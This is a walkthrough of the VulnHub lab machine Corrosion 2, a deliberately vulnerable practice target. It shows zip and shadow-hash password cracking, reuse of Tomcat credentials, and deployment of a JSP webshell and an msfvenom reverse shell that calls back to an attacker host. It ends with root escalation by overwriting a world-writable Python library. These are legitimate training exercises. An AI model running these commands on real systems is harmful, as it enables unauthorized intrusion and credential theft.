---
title: 'Corrosion 2: Vulnhub Walkthrough'
description: "Walkthrough of Corrosion 2 vulnhub box. This is considered to be a medium level that involves zip file password cracking and RCE via tomcat protocol."
date: 2024-08-08T19:20:39-08:00
featured: false 
draft: false
comment: true
toc: true
pinned: false
carousel: false
series:
  - walkthroughs
categories:
tags: [] 
images: [corrosion-2.jpg]
---

## Introduction

| URL | [https://www.vulnhub.com/entry/corrosion-2,745/](https://www.vulnhub.com/entry/corrosion-2,745/) |
| --- | --- |
| Platform | VulnHub |
| Difficulty | Medium |

## Walkthrough

Run `nmap -A` scan against all TCP ports:

```shell
└─$ nmap -A -sC -p- 192.168.5.114
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 19:42 EDT
Nmap scan report for 192.168.5.114
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)
|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)
|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat 9.0.53
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.53
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.43 seconds
```

\
Run `nikto` scan on port 8080 to discover "backup.zip":

```shell
└─$ nikto -timeout 2 -h http://192.168.5.114:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.5.114
+ Target Hostname:    192.168.5.114
+ Target Port:        8080
+ Start Time:         2024-08-05 17:46:37 (GMT-7)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ OSVDB-3092: /readme.txt: This might be interesting...
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ /host-manager/status: Default Tomcat Server Status interface found
+ 8069 requests: 0 error(s) and 16 item(s) reported on remote host
```

\
Download backup.zip:

```shell
└─$ wget http://192.168.5.114:8080/backup.zip -O backup.zip
```

\
Crack zip file password with `fcrackzip` & rockyou password list:

```shell
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
PASSWORD FOUND!!!!: pw == @administrator_hi5    
```

\
Unzip `backup.zip` using password:

```shell
└─$ unzip backup.zip                                                   
Archive:  backup.zip
[backup.zip] catalina.policy password: 
password incorrect--reenter: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml   
```

\
Find tomcat admin password in `tomcat-users.xml`:

```shell
└─$ cat tomcat-users.xml | grep -i password
...
<user username="manager" password="melehifokivai" roles="manager-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
```

{{< bs/alert >}} {{< markdownify >}} **Option 1:** RCE via webshell
 ```shell
└─$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```

1. On Tomcat Web Application Manager page, upload backup.war under "WAR file to deploy".
2. **Visit:** http://192.168.5.114:8080/backup/cmd.jsp
{{< /markdownify >}} {{< /bs/alert >}}


\
{{< bs/alert info >}} {{< markdownify >}} **Option 2:** RCE via msfvenom reverse shell:

```shell
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.5.10 LPORT=31337 -f war > shell.war
```

1. On Tomcat Web Application Manager page, upload `shell.war` under "WAR file to deploy".
2. Click on WAR file in Tomcat after it finished uploading
3. Receive reverse shell via netcat:

```shell
└─$ nc -nvlp 31337
listening on [any] 31337 ...
connect to [192.168.5.10] from (UNKNOWN) [192.168.5.114] 42390
```
{{< /markdownify >}} {{< /bs/alert >}}

\
Discover users `randy` and `jaye` in `/etc/passwd`:

```shell
└─$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
...
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
tomcat:x:1001:1001::/home/tomcat:/bin/sh
sshd:x:127:65534::/run/sshd:/usr/sbin/nologin
jaye:x:1002:1002::/home/jaye:/bin/sh
```

\
Find `note.txt` in randy's home folder:

```shell
└─$ cat /home/randy/note.txt

Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know that I changed your permissions for your home directory. You won't be able to remove or add files for now.

I will change these permissions later on.

See you next Monday randy!
```

\
Find user-level flag in randy's home folder:

```shell
cat /home/randy/user.txt

ca73a018ae6908a7d0ea5d1c269ba4b6
```

\
Reuse admin password from tomcat for user "jaye":

```shell
└─$ ssh jaye@192.168.5.114
jaye@192.168.5.114's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)
```

\
Use look command (SUID as root) to pull the shadow file:

```shell
jaye@corrosion:~/Files$ ./look '' /etc/shadow
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
...
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
systemd-coredump:!!:18886::::::
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
sshd:*:18887:0:99999:7:::
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```

\
Crack the randy user password with `JohnTheRipper` and `rockyou.txt` password list:

```shell
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ./corrosion.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
                                                                                                                                 
07051986randy    (randy)                                                                                                                                                                                                                                                                                                    
1g 0:00:16:22 DONE (2024-08-05 22:02) 0.001018g/s 14186p/s 14186c/s 14186C/s 070624960..0702328                                                                                                                                                                                                                             
Use the "--show" option to display all of the cracked passwords reliably                                                                                                                                                                                                                                                    
Session completed.  
```

\
Reconnect to SSH as randy:

```shell
ssh randy@192.168.5.114
```

\
Check for world-writeable files:

```shell
$ find / -xdev \( -perm -0002 -a ! -perm -1000 \) -type f -print 2>&1 |grep -v "Permission denied"
/usr/lib/python3.8/base64.py
```

\
Run `sudo -l` to discover randy can run randombase64.py as root:

```shell
randy@corrosion:~$ sudo -l
[sudo] password for randy:
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```

\
Create a python script (`/tmp/test.py`) that launches `/bin/bash`:

```python
# Importing required module
import os
 
os.system('/bin/bash')
```

\
Overwrite `/usr/lib/python3.8/base64.py` with our python script:

```shell
cp /tmp/test.py /usr/lib/python3.8/base64.py
```

\
Run `randombase64.py` as root:

```shell
randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py
root@corrosion:/home/randy# id
uid=0(root) gid=0(root) groups=0(root)
```

\
Grab root flag:

```shell
root@corrosion:/home/randy# cat /root/root.txt
2fdbf8d4f894292361d6c72c8e833a4b
```

